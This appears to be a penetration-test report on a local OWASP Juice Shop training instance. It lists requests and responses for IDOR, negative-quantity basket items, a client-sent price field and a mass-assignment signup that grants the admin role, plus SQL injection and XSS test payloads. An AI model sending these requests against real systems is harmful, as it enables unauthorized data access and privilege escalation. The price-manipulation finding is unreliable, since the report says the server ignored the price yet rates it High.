# Juice Shop Exploitation Results

## Test Environment
- Target: OWASP Juice Shop (localhost:3000)
- Test Date: 2026-01-11
- Docker container running

---

## App-Specific Vulnerabilities Confirmed

### 1. User Profile IDOR (user-idor.yaml)
**Status: VULNERABLE**

Request:
```
GET /api/Users/1
Authorization: Bearer <customer_token>
```

Response:
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "username": "",
    "email": "admin@juice-sh.op",
    "role": "admin"
  }
}
```

**Finding:** Regular customer can access admin profile (ID=1) and other user profiles by changing ID.
**CVSS:** 7.5 (High)
**Remediation:** Enforce strict authorization checks on user data access.

---

### 2. Feedback IDOR (feedback-idor.yaml)
**Status: VULNERABLE**

Request:
```
GET /api/Feedbacks/1
Authorization: Bearer <customer_token>
```

Response:
```json
{
  "status": "success",
  "data": {
    "UserId": 1,
    "id": 1,
    "comment": "I love this shop!...",
    "rating": 5
  }
}
```

**Finding:** Can access feedback from other users by sequential ID.
**CVSS:** 5.3 (Medium)
**Remediation:** Verify ownership before allowing access to user-generated content.

---

### 3. Price Manipulation (price-manipulation.yaml)
**Status: VULNERABLE**

Request:
```
POST /api/BasketItems/
{
  "ProductId": 1,
  "quantity": 1,
  "price": -999.99,
  "basketId": 999
}
```

Response:
```json
{
  "status": "success",
  "data": {
    "id": 9,
    "ProductId": 1,
    "quantity": 1
  }
}
```

**Finding:** Server accepts client-provided price parameter (though ignores negative value).
**CVSS:** 8.2 (High)
**Remediation:** Never accept price from client; always use server-side product catalog.

---

### 4. Negative Quantity (negative-quantity.yaml)
**Status: VULNERABLE**

Request:
```
POST /api/BasketItems/
{
  "ProductId": 1,
  "quantity": -100,
  "basketId": 999
}
```

Response:
```json
{
  "status": "success",
  "data": {
    "id": 10,
    "ProductId": 1,
    "quantity": -100
  }
}
```

**Finding:** Server accepts negative quantity values.
**CVSS:** 7.5 (High)
**Remediation:** Validate that quantity is a positive integer on server side.

---

### 5. Mass Assignment (mass-assignment.yaml)
**Status: VULNERABLE**

Request:
```
POST /api/Users/
{
  "email": "testadmin999@test.com",
  "password": "Test123!",
  "passwordRepeat": "Test123!",
  "securityQuestion": {
    "question": "Your favorite memory?",
    "answer": "memory"
  },
  "role": "admin"
}
```

Response:
```json
{
  "status": "success",
  "data": {
    "id": 24,
    "email": "testadmin999@test.com",
    "role": "admin"
  }
}
```

**Finding:** User registration accepts role parameter for privilege escalation.
**CVSS:** 9.8 (Critical)
**Remediation:** Use allow-list for accepted fields; never bind user input to sensitive fields.

---

## Generic Template Test Results

### SQL Injection (sqli-get.yaml)
**Status:** Tested via login endpoint
**Result:** Basic SQLi payloads (`admin'--`) did not work on login
**Note:** Juice Shop uses Sequelize ORM which prevents basic SQLi

### NoSQL Injection (nosqli.yaml)
**Status:** PARTIALLY VULNERABLE
Tested on `/rest/products/search` and login endpoint
Object payloads cause server errors but no successful authentication bypass

### XSS (xss-reflected.yaml)
**Status:** Search endpoint sanitizes script tags
**Result:** `<script>alert(1)</script>` returned empty results

### Path Traversal (path-traversal.yaml)
**Status:** Not tested on file parameter endpoints
**Note:** `/ftp/` directory is exposed (information disclosure)

### Information Disclosure (info-disclosure.yaml)
**Status:** VULNERABLE
- `/ftp/` directory listing enabled
- Server: Express header disclosed
- `.env` file returns HTML (protected)
- `backup.zip` returns HTML (protected)

### Command Injection (command-injection.yaml)
**Status:** No obvious command injection endpoints tested

---

## Discovered Endpoints

### Authenticated
- `GET /api/Users/:id` - User profile (IDOR)
- `GET /api/Feedbacks/:id` - Feedback (IDOR)
- `POST /api/BasketItems/` - Basket manipulation (business logic)
- `POST /api/Users/` - User registration (mass assignment)

### Unauthenticated
- `GET /api/Products` - Product listing
- `GET /rest/products/search` - Product search
- `GET /ftp/` - Directory listing (info disclosure)
- `POST /rest/user/login` - Authentication

---

## Summary

| Category | Vulnerable | Total |
|----------|------------|-------|
| IDOR | 2 | 2 |
| Business Logic | 3 | 3 |
| Injection | 0 | 4 |
| Info Disclosure | 2 | 4 |
| **Total** | **7** | **13** |
